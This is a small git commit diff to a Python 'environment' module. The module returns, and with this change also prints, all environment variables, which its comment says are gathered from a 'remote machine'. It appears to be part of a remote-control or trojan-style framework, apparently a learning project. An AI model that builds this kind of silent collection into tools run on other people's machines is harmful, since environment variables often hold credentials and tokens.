a907bf21f9e4859700b3decc8ee59d2f04efff5d
Alex <52384614+alXCS@users.noreply.github.com>
2021-10-07 14:50:42 +0300

    Update environment.py
    Edited environment.py to print

--- modules/environment.py
+++ modules/environment.py
@@ -2,6 +2,7 @@ import os
 
 def run(**args):
     print("[*] In environment module.")
+    print(str(os.environ))
     return str(os.environ) #retrieves any environment variables that are set on the remote machine.
 if __name__ == '__main__':
     run()
